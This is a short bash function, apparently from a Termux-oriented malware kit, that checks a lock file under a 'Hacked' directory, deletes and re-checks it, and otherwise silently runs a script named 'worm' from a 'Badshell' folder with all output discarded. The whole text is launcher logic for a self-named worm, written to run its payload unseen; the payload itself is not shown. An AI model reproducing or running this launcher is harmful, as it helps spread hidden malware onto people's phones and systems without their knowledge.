Safe_worm(){

if [[ -f $PREFIX/etc/Hacked/LOCKS/worm_lock_file ]];then

	if [[ $(cat $PREFIX/etc/Hacked/LOCKS/worm_lock_file) == "End" ]];then

		printf ""

	else

		rm -rfd $PREFIX/etc/Hacked/LOCKS/worm_lock_file
		Safe_worm
	fi

else

	bash $PREFIX/etc/Hacked/Badshell/worm &>> /dev/null

fi

}
